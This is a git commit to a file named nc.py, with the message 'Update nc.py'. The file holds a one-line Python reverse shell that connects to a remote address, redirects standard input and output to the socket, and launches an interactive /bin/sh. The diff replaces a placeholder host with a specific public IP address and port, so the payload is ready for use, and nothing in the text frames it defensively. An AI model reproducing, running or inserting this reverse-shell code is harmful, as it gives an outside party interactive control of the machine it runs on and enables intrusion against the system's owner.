6d3b4feacc45de90e3edb5d698e9cbac3375e123
tyraniter <tyraniter@gmail.com>
2020-02-25 10:21:59 +0800

    Update nc.py

--- nc.py
+++ nc.py
@@ -1,2 +1,2 @@
 import socket,subprocess,os;
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",18080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("139.196.171.222",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
